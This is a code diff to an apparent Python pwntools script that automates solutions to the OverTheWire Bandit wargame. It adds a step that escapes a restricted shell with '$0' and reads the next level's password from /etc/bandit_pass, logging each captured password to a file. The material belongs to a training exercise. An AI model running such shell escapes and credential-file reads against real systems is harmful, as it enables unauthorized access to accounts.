@@ -18,7 +18,7 @@ def add_flag():
     global flag, i, user
     i+=1
     user=b"bandit"+bytes(str(i),"ascii")
-    if user not in [b'bandit15', b'bandit16', b'bandit25']:
+    if user not in [b'bandit15', b'bandit16', b'bandit25', b'bandit33']:
         flag=flag[2:]
     f.write(user+b":\t"+flag)
     flag=flag[:-1]
@@ -374,6 +374,17 @@ sh.sendline(flag)
 sh.recvuntil(b'remote: Well done! Here is the password for the next level:\x1b[K\n')
 sh.recvuntil(b'remote')
 end()
+
+# bandit32 --> bandit33
+print([flag])
+start()
+sh.sendline(b'$0')
+sh.sendline(b'cat /etc/bandit_pass/bandit33')
+sh.recvuntil(b'$ cat /etc/bandit_pass/bandit33\r\n')
+end()
+
+# bandit33 --> bandit34
+# start()
 
 # end
 f.close()
